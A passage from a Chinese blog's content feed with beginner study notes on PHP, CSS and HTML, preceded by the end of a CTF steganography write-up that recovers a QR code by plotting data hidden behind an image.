src="http://img-blog.csdnimg.cn/20190410195323228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>同样的套路，得到：</p><p><img src="http://img-blog.csdnimg.cn/20190410195501146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr><p><strong>画图题：</strong><br>打开发现有个萌妹子：</p><p><img src="http://img-blog.csdnimg.cn/20190410200137789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用winhex打开发现图片后面有很多的数据：<br><img src="http://img-blog.csdnimg.cn/20190410200318425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>复制下来保存为txt文件用notepad++转换一下编码</p><p><img src="http://img-blog.csdnimg.cn/20190410200522981.png" alt="在这里插入图片描述"></p><p><img src="http://img-blog.csdnimg.cn/20190410200659463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>接下来就是取坐标，用Notepad++的替换功能：</p><p><img src="http://img-blog.csdnimg.cn/20190410200929937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>另存为txt文件，接下来使用一个画图工具：gnuplot（百度 下载地址很多）把txt文件拖进bin目录下，然后执行命令：<br>plot”文件名.txt”</p><p><img src="http://img-blog.csdnimg.cn/2019041020172961.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>回车：<img src="https://img-blog.csdnimg.cn/20190410201740269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫描二维码得到flag:<img src="http://img-blog.csdnimg.cn/20190410201959720.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">。。。<br>。。。</p>]]></content>
      
      
      <categories>
          
          <category> CTF刷题 </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LSB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习记录</title>
      <link href="2019/04/07/PHP%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>2019/04/07/PHP%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><strong>1.PHP概述</strong></p><ul><li>php的目标是允许网络开发人员快速编写动态页面</li><li>主要被用于开发各种网站程序</li><li>是脚本语言，不需要事先编译，在服务器运行。</li></ul><p> <strong>2.web工作原理</strong><br> web服务器： 浏览器-&gt;输入url地址-&gt;显示网站内容<br> 服务器是一种软件，把安装运行了服务器的电脑叫主机（host）</p><p> <img src="https://github.com/weiwanchengdege/photos/blob/master/20190406225149649.png?raw=true" alt="在这里插入图片描述"><br> <strong>3.php脚本语言</strong><br> 开始: <?php 结束: ?><br> <?php ?>表示进入php模式。</p><ul><li>PHP代码可以嵌入到html代码中任何位置，并且可以嵌入任意多个。</li><li>文件末尾的?&gt;结束标志可以省略</li><li> 一些PHP语句的结尾要加上;表示一句话的结束</li><li>结束标记?&gt;就隐含了一个;</li></ul><p> 1)多行注释<br>   /*<br>    多行注释<br>   */<br>  2)单行注释<br>   //我是单行注释<br>   3.变量<br> 变量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器<br>   变量用于存储 数字、文本字符串 或者数组这些数据!</p><pre><code>  $变量名=数据(值)</code></pre><p>1.变量的销毁</p><pre><code> unset($变量名称)  $and1=1;  unset($and1);//销毁$and变量  echo $and1;//提示出错，因为变量已经被销毁了！   </code></pre><p>2 .变量的命名规则<br>  1)变量名称严格区分大写</p><pre><code>   $name,$NAME,$Name都是不同的变量</code></pre><p>   2）</p><p>   字母或者下划线开头<br>   后面接任意数量的字母数字下划线都可以!</p><p>   错误的命名方式：<br>    $1name  错误点：以数字开头了<br>    $n ame  错误点：中间有空白字符<br>   总结一下：变量名只能包含 字母 数字 下划线 并且必须以字母或者下划线开头！</p><p>  3)最好不要用一些关键字作为变量名称(因为在其他的编程语言里面是完全不被允许的)!<br>  <strong>4.变量类型</strong><br>  1.变量类型简介<br>    1）bool (布尔型)<br>       <code>$a=true;</code><br>    <code>var_dump($a);</code><br>    往变量里面存true或者false，那么这个变量就是布尔型了<br>    2）int (整型)<br>    往变量里面存整数，那么这个变量就是整型变量啦！<br>    3）float (浮点型，也称double)<br>    往变量里面存小数，那么这个变量就是浮点型数据了!<br>   <code> $a=1.1;</code><br><code>    var_dump($a);</code><br>  4）string (字符串)<br>    字符串就是一系列的字符组成串在一起！<br>    1单引号：</p><pre><code>   $b=1;    $a=&#39;test$bdwqd\&#39;wqdqw&#39;;    var_dump($a);    echo $a;</code></pre><p>  在定义一些简单的字符串的时候使用单引号这种方法效率比较高！<br>    2双引号</p><pre><code>   $b=100;    $a=&#39;te$bst......&#39;;    $a=&quot;te&#123;$b&#125;st......&quot;;    var_dump($a);    echo $a;</code></pre><p> 3定界符</p><pre><code>  $b=200;    $a=&lt;&lt;&lt;www    dwqdqwdwq&#123;$b&#125;dwqdqdqdqdwqdwqcwcfwefwefcscwecwefwdqwdqdefwefwefewfwe    www;    var_dump($a);</code></pre><p>   3定界符</p><p>$b=200;<br>$a=&lt;&lt;&lt;www<br>dwqdqwdwq{$b}dwqdqdqdqdwqdwqcwcfwefwefcscwecwefwdqwdqdefwefwefewfwe<br>www;<br>var_dump($a);</p><p>4）NULL</p><pre><code> null表示一个变量没有值，表示空    将变量直接赋值为null    声明的变量尚未被赋值    被unset函数销毁的变量    $a=1111;    unset($a);    var_dump($a);</code></pre><p><strong>5.常量</strong><br> 1.概念<br>  常量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器<br> 2.定义和使用<br>  define(‘常量名称’,常量值) 或者 define(“常量名称”,常量值)<br>  常量的命名：<br>   1)和变量一样 只能包含字母数字下划线 并且必须以 字母或者下划线开头<br>   2)按照惯例常量名字总是大写的<br>   3)自定义的常量是严格区分大小写的！<br>  defined()函数来检查是否定义了某个常量<br> 3.常量和变量的区别<br>  1)常量前面没有美元符号($)<br>  2)常量只能用define()函数定义，不能通过赋值语句<br>  3)<strong>****</strong>常量可以不用理会变量范围的规则而在任何地方定义和使用<br>  4)常量一旦被定义就不能被重新定义或者取消定义<br>  5)常量的值只能是bool,int,float,string类型<br> 4.预定义常量<br>  预定义常量说白了就是我们的PHP内核已经帮我们定义好了的常量!</p><p>  其中有的预定义常量是一__开头的，这些预定义常量我们又叫它魔术常量</p><p>   代码所在的位置不同他的值也是不同的，所以它加 魔术常量<br>  八个常用的魔术常量<br>   <a href="http://php.net/manual/zh/language.constants.predefined.php">http://php.net/manual/zh/language.constants.predefined.php</a><br>  预定义常量是不区分大小写的！<br>  <strong>6.运算符</strong><br> 概述：<br>  说白了就是一些符号，这些符号可以将变量或者数据执行某中运算！<br> 1.算术运算符<br>  1)+</p><pre><code> $a=1;   $b=2;   $c=$a+$b;   echo $c;</code></pre><p>2)-<br>   第一个意思： 减号</p><pre><code> $a=10;    $b=2;    $c=$a-$b;    echo $c;</code></pre><p> 第二个意思： 取反</p><pre><code>$a=1;$b=-$a;echo $b;//-1echo &#39;&lt;br /&gt;&#39;;echo $a;//1 注意</code></pre><p>：取反并不会影响到被取反变量本身的值!<br>  3)* 乘号</p><pre><code>   $a=4;   $b=2;   $c=$a*$b;   echo $c;</code></pre><p>4)/ 除号</p><pre><code>   $a=10;   $b=2;   $c=$a/$b;   echo $c;</code></pre><p>5)% 取模</p><pre><code>   $a=12;   $b=2;   echo $a%$b;</code></pre><p> 6)++ 自增<br>   前++<br>    当在一个语句里面需要使用到被自增的变量的值的时候，前++会先执行自增,然后再返回自增之后的值！</p><pre><code>  $a=10;    echo ++$a;//11</code></pre><p>   后++<br>    当在一个语句里面需要使用到被自增的变量的值的时候，后++会先返回变量的值然后再去执行自增</p><pre><code>   $a=10;    //++$a;//$a=$a+1;    //$a++;//$a=$a+1;    echo $a++;//echo $a;$a=$a+1;    echo &#39;&lt;br /&gt;&#39;;    echo $a;//11</code></pre><p> 注意：</p><pre><code>$a=10;   ++$a;//这种情况不需要用到自增变量值的时候，和后++无区别   echo $a;</code></pre><p> 7)– 自减<br>   前–</p><pre><code>$a=10;//$a--;//$a=$a-1; 和--$a没区别;echo --$a;//$a=$a-1;echo $a;echo &#39;&lt;br /&gt;&#39;;echo $a;</code></pre><p>   后–</p><pre><code>    $a=10;    //$a--;//$a=$a-1; 和--$a没区别;    echo $a--;//echo $a;$a=$a-1;    echo &#39;&lt;br /&gt;&#39;;    echo $a;  注</code></pre><p>意：自增或者自减是对变量而言的！<br>2.字符串运算符<br>  . 连接运算符</p><pre><code>$a=&#39;孙胜利&#39;;$b=&#39;测试字符串连接符&#39;;echo $a.$b;</code></pre><p> 3.赋值运算符<br><code>  =</code><br>   把右边的值赋给左边的变量<br> <code>  $a=1;</code><br>   二元运算符</p><p>   表达式是 PHP 最重要的基石。在 PHP 中，几乎所写的任何东西都是一个表达式。简单但却最精确的定义一个表达式的方式就是“任何有值的东西”。</p><pre><code>   +=   $a=1;   $b=2;   $a+=$b;//$a=$a+$b;   echo $a;  -=   $a=2;   $b=1;   $a-=$b;//$a=$a-$b   echo $a；</code></pre><p>  4.比较运算符<br>  概念：<br>  对操作数（按照比较运算符的要求,规则）进行比较<br>   如果比较出的结果满足比较运算符的要求那么结果就是true(真，成立，满足),否则就是false（假，不成立,不满足）<br>  PHP中规定：<br>   使用echo输出布尔类型值的时候<br>    echo true;它在页面中会输出1<br>    echo false;它会在页面中什么都不输出<br>    规定的，记住就好！所以说我们在测试的过程中如果需要输出布尔类型值的时候我们最好使用var_dump()来输出更明了的结果！</p><p>  1)== 值是否相等<br>   如果值相等则就是 true（真，成立）<br>   如果值不相等那么就是false（假，不成立）</p><pre><code>$a=1;   $b=1;   var_dump($a==$b);//true</code></pre><p> 2)=== 全等（值要相等，类型也要相等）<br>   如果两边操作数的值 全等那么就是true否则就是false</p><pre><code> $a=11;   $b=&#39;11&#39;;   //var_dump($a==$b);//true   var_dump($a===$b);//false</code></pre><p>3)!= 值是否不相等<br>   如果两边操作数的值不相等那么就是true，否则就是false</p><pre><code>$a=1;   $b=11;   var_dump($a!=$b);//true</code></pre><p> 4)&lt;&gt; 同上<br> 5)!== 不全等<br>   如果两边的操作数不全等那么就是true，否则就是false<br>   /*</p><pre><code>$a=1111;   $b=2;   var_dump($a!=$b);//true   var_dump($a!==$b);//true   */   $a=11;   $b=&#39;11&#39;;   var_dump($a!=$b);//false   var_dump($a!==$b);//true,$a不全等于$b</code></pre><p> 6)&lt; 小于<br>   比较两边操作数的值，前面的是否小与后面的</p><pre><code>   $a=1;   $b=1;   var_dump($a&lt;$b);//false,$a小与$b</code></pre><p>这句话正确还是错误</p><pre><code>7)&gt; 大于   $a=10;   $b=1;   var_dump($a&gt;$b);</code></pre><p>8)&lt;= 小于等于</p><pre><code> $a=1;   $b=1;   var_dump($a&lt;=$b);//$a小与等于$b就是true,否则就是false</code></pre><p> 9)&gt;= 大于等于</p><pre><code>$a=2;   $b=1;   var_dump($a&gt;=$b);//true</code></pre><p><strong>5.逻辑运算符</strong><br>  概念：<br>   对表达式进行逻辑运算，运算出的结果是布尔类型的值（true,false）<br>   要求：<br>    参与逻辑运算的表达式的值是布尔类型的值，如果不是布尔类型的值会被PHP自动转换成布尔类型的值，然后再参与运算！<br>  1)逻辑与<br>   and 或者 &amp;&amp;<br>    运算规则：<br>     左右两边的表达式的值都为true的时候，运算的结果就是true<br>     否则只要其中任意一个为false，运算的结果就是false;<br>    现实举例：<br>     true 及格<br>     false 不及格<br>     左右两边的表达式就是我们要考试的科目;<br>     要求：当语文和数学都及格的时候那么，最终的结果才能够通过(true),否则就是不通过(false)</p><pre><code> $a=false;//语文 $b=true;//数学 var_dump($a &amp;&amp; $b);</code></pre><p>   中间隐含一个问题：“短路”,运算符的优先级的问题！<br>  2)逻辑或<br>   or 或者 ||<br>    运算规则：<br>     左右两边的表达式的值有一个为true，运算的结果就是true<br>     ，只有当两边的值都是false的时候，结果才会是false</p><pre><code> $a=false;//语文 $b=true;//数学 var_dump($a || $b);</code></pre><p>   现实举例：<br>    要求：当语文和数学有一门及格那么最终的结果就是通过true<br>   中间隐含一个问题：“短路”,运算符的优先级的问题！<br>  3)逻辑异或<br>   xor<br>    运算规则：<br>     左右两边的表达式的值不一样的时候结果就是true,如果一样那么运算的结果就是false</p><pre><code>$a=false;$b=false;var_dump($a xor $b);</code></pre><p>  4)逻辑非<br>   !<br>    运算规则：<br>     将原来表达式的值否定掉，原来是true，那么结果就是false<br>      原来是false，那么结果就是true</p><ul><li>5)运算符<br>   1)? :<br>三元运算<br>格式：<br> 表达式1 ? 表达式2 : 表达式3;<br> 如果表达式1的值为true,那么就执行表达式2,否则那么就执行表达式3<br>$a=false ? 10 : 20;<br>echo $a;//20</li></ul><ol start="2"><li>可以把系统的命令放在里面执行！<br>涉及到跨平台:</li></ol><pre><code>    $a=`ipconfig`;windows环境下    $b=`ifconfig`;liunx环境下    var_dump($b);</code></pre><p> 3)@<br>   屏蔽表达式可能发生错误！<br>   echo @$a;<br>   当然，实际在哪些地方应用，我们用到大家就知道了！<br>  4)=&gt;<br>  5)-&gt;<br>  6)instanceof<br> 8.运算符的优先级<br>  优先级的概念：<br>   谁的优先级别高就先算谁！<br>  结合方向：<br>   规定了从那个方向开始算的问题！</p><p>  优先级这个概念只要知道一些基本的常用的就可以了，因为我们在实际开发中几乎没有那么需要写非常复杂的表达式，<br>  让我们去考虑先算谁，后算谁的问题！</p><p>  优先级归纳:<br>   1)[无]递增递减<br>   2)[右]逻辑非!<br>   3)[左]乘，除，取余<br>   4)[左]加，减，字符串连接符<br>   5)[无]包含大于号或者小于号的比较运算符<br>   6)[无]不包含大于号或者小于号的比较运算符<br>   7)[左]逻辑与&amp;&amp;<br>   8)[左]逻辑或||<br>   9)[左]? :<br>   10)[右]赋值运算符<br>   12)[左 ]逻辑异或xor<br>  圆括号的作用：<br>   用圆括号可以将表达式里面的某一块看成一个整体！<br>  *使用括号可以增强代码的可读性。<br><strong>6.流程控制</strong><br>if语句<br>switch语句<br>循环语句<br>与C语言基本相同就不再详写。<br><em>特殊的流程控制语句</em><br> 1.break语句<br>  作用：用于switch语句，for，while，do…while，foreach，用于中断这些语句！<br>     后面可以接上一个数字来表示跳出几层循环！默认不加就是跳出当前循环语句！<br> 2.continue语句<br>  作用：只能用在循环语句，跳出本次循环，并不是结束整个循环语句！<br> 3.exit()语句<br>  作用：结束当前整个程序的执行！<br>  die()语句作用同上！</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS练习小结</title>
      <link href="2019/03/31/CSS%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>2019/03/31/CSS%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p><strong>css引入方式</strong></p><p> 内联引入</p><pre><code>   &lt;body&gt;         &lt;div style=&quot;color:red;width:100px;heigh:100px;&quot;&gt;苹果&lt;/div&gt;     &lt;div style=&quot;color:green;width:100px;heigh:100px;&quot;&gt;苹果&lt;/div&gt;     &lt;div style=&quot;color:gray;width:100px;heigh:100px;&quot;&gt;核桃&lt;/div&gt;     &lt;div style=&quot;color:yellow;width:100px;heigh:100px;&quot;&gt;香蕉&lt;/div&gt;    &lt;/body&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/201903301714023.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><hr>内部引入<pre><code> &lt;style&gt;         div&#123;          color:red;            width:100px;        height:100px;             &#125;    &lt;/style&gt;     &lt;/head&gt;     &lt;body&gt;    &lt;div&gt;苹果&lt;/div&gt;    &lt;/body&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190330171658457.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><hr><br>外部引入<br><img src="http://img-blog.csdnimg.cn/20190330180205676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><hr><p><img src="http://img-blog.csdnimg.cn/20190330175808917.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><strong>css选择器</strong><br>CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明:<br>选择器通常是您需要改变样式的 HTML 元素。<br>   选择器主要由有四大类：</p><ul><li>基本选择器</li><li>组合选择器</li><li>属性选择器</li><li>伪元素选择器</li></ul><p><strong>基本选择器：</strong><br>通配符:全部都被标注！<br>标签div：<br>div{<br>     }只有对应的div才被标注<br> <img src="http://img-blog.csdnimg.cn/20190330212130114.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="有唯一性"><br>id选择器：<img src="http://img-blog.csdnimg.cn/20190330212604222.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p>class：<img src="http://img-blog.csdnimg.cn/2019033021335212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="没有唯一性性"></p><hr>**css原理**<p>1.优先原理：后解析的内容会覆盖掉之前的内容<br>2.继承原则：嵌套里面的标签拥有外部标签的某些样式；子元素可以继承父元素的属性。<br>优先原则：-》选择器<br>1.同一个选择器：从上往下执行。<br><img src="http://img-blog.csdnimg.cn/20190331102853541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70">效果如下</p><p><img src="http://img-blog.csdnimg.cn/20190331103330788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>3.不同类型的选择器：优先级<br>先解析低优先级；<br>div&lt;class&lt;id<br>原理同上 <hr></p><p>4.外部样式 内部样式合并之后再一起解析<br>先外部样式再内部。<br>其他原理同上。<br>5.内联样式：外部和内部解析完之后再解析内联。<br>6.加了important字段的 最后执行。<br><strong>继承原则</strong></p><p>1.文字 文本 样式 可被继承</p><pre><code>       div.txt&#123;        color:red;        &#125;        &lt;body&gt;           &lt;div class=&quot;txt&quot;&gt;          苹果      &lt;p&gt; 香蕉   &lt;/p&gt;      &lt;/div&gt;     &lt;/body&gt;</code></pre><p>其中苹果和香蕉属性相同。</p><p>2.块级元素 宽度不被设置时则会继承父级元素的宽，高由内容决定。<br><strong>组合选择器</strong><br>把基本选择器 通过特殊字符串在一起<br>分组选择器<br>用逗号隔开：div,p 代表两个选择器内容共同<br>嵌套选择器<br>用空格隔开：div p  嵌套在div里的p才能生效<br>子选择器<br>div&gt;p 必须是上一级的div才能生效。<br>相邻选择器；同级别的<br>div+p<br><strong>属性选择器</strong></p><p><img src="http://img-blog.csdnimg.cn/20190331122301403.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>css背景</strong><br>CSS 属性定义背景效果:</p><p><em>background-color</em>属性定义了元素的背景颜色.<br><em>background-image</em>属性描述了元素的背景图像.<br>默认情况下，背景图像进行平铺重复显示<br><em>background-repeat</em>：<br>background-repeat:repeat-x;水平方向平铺<br>background-repeat:repeat-y;垂直方向平铺<br>background-repeat:no-repeat;不平铺<br><em>background-attachment</em>：<br>scroll<br>背景图片随页面的其余部分滚动。这是默认<br>fixed<br>背景图像是固定的<br>使用简写属性时，属性值的顺序为：:</p><p>   background-color<br>    background-image<br>    background-repeat<br>    background-attachment<br>    background-position</p><p><strong>css字体</strong><br>font<br>    在一个声明中设置所有的字体属性</p><p>font-family<br>    指定文本的字体系列</p><p>font-size<br>    指定文本的字体大小</p><p>font-style<br>    指定文本的字体样式</p><p>font-variant<br>    以小型大写字体或者正常字体显示文本。</p><p>font-weight<br>    指定字体的粗细。</p><p>   <strong>css链接和列表</strong><br>链接的样式，可以用任何CSS属性（如颜色，字体，背景等）。<br>特别的链接，可以有不同的样式，这取决于他们是什么状态。<br>这四个链接状态是： </p><p>a:link - 正常，未访问过的链接<br>    a:visited - 用户已访问过的链接<br>    a:hover - 当用户鼠标放在链接上时<br>    a:active - 链接被点击的那一刻<br>    <img src="http://img-blog.csdnimg.cn/20190331152838763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>    <strong>css盒子模型</strong><br>    Margin(外边距) - 清除边框外的区域，外边距是透明的。<br>Border(边框) - 围绕在内边距和内容外的边框。<br>Padding(内边距) - 清除内容周围的区域，内边距是透明的。<br>Content(内容) - 盒子的内容，显示文本和图像。</p><pre><code>div &#123;    width: 300px;    border: 25px solid green;    padding: 25px;    margin: 25px;&#125;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190331154327409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><strong>css布局</strong><br><img src="http://img-blog.csdnimg.cn/20190331172852392.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">清除浮动在下一个div中添加<br>div{<br>clean :both;<br>}就可以将恢复浮动</p><p><strong>css定位</strong><br>position 属性的五个值：<br>static:HTML 元素的默认值，即没有定位,遵循正常的文档流对象。<br>relative:相对定位元素的定位是相对其正常位置。<br>fixed:元素的位置相对于浏览器窗口是固定位置。<br>即使窗口是滚动的它也不会移动：<br>absolute:绝对定位的元素的位置相对于最近的已定位父元素，如果元素没有已定位的父元素，那么它的位置相对于<html>:<br>sticky:这个有点魔性，就不写了。。。</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML练习记录</title>
      <link href="2019/03/30/html%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>2019/03/30/html%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<p> <strong>网页基本结构</strong>：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt; 标题&lt;/title&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt; hello world!&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328143835884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>  <strong>-html 文本</strong><br><img src="http://img-blog.csdnimg.cn/20190328145055305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><p><strong>-HTML 图像</strong><br>HTML 图像是通过标签<code> &lt;img&gt;</code> 来定义的.<br><code>&lt;img&gt; </code>是空标签，意思是说，它只包含属性，并且没有闭合标签。要在页面上显示图像，你需要使用源属性（src）。src 指 “source”。源属性的值是图像的 URL 地址。<br>URL 指存储图像的位置。</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt; 图片&lt;/title&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;img src=&quot;C:\360downloads\wpcache\internetcache\5.jpg&quot;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328150212679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br><strong>超文本链接</strong><br>HTML 链接是通过标签<code>&lt;a&gt;</code>  来定义的.</p><p>实例</p><pre><code>&lt;a href=&quot;https://store.steampowered.com/&quot;&gt;这是一个链接&lt;/a&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328160017517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>1.HTML 链接 - target 属性</p><p>使用 target 属性，你可以定义被链接的文档在何处显示。</p><p>下面的这行会在新窗口打开文档：</p><pre><code>&lt;a href=&quot;https://store.steampowered.com//&quot; target=&quot;_blank&quot;&gt;stream 官网&lt;/a&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328160116863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><strong>html图片映射</strong></li><li><strong>html列表</strong><br>无序列表使用<code>&lt;ul&gt;</code> 标签<br>有序列表使用<code>&lt;ol&gt;</code>标签</li></ul><pre><code>无序列表  &lt;ul&gt;&lt;li&gt;Coffee&lt;/li&gt;&lt;li&gt;Milk&lt;/li&gt;&lt;/ul&gt;有序列表&lt;ol&gt;&lt;li&gt;Coffee&lt;/li&gt;&lt;li&gt;Milk&lt;/li&gt;&lt;/ol&gt;</code></pre><p><img src="http://img-blog.csdnimg.cn/20190328165051175.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>-HTML 表格</strong><br>表格由<code> &lt;table&gt;</code> 标签来定义。每个表格均有若干行（由<code> &lt;tr&gt;</code> 标签定义），每行被分割为若干单元格（由<code> &lt;td&gt;</code> 标签定义）。字母 td 指表格数据（table data），即数据单元格的内容。数据单元格可以包含文本、图片、列表、段落、表单、水平线、表格等。 </p><pre><code>&lt;table border=&quot;1&quot;&gt;    &lt;tr&gt;        &lt;td&gt;row 1, cell 1&lt;/td&gt;        &lt;td&gt;row 1, cell 2&lt;/td&gt;    &lt;/tr&gt;    &lt;tr&gt;        &lt;td&gt;row 2, cell 1&lt;/td&gt;        &lt;td&gt;row 2, cell 2&lt;/td&gt;    &lt;/tr&gt;&lt;/table&gt;</code></pre><p><img 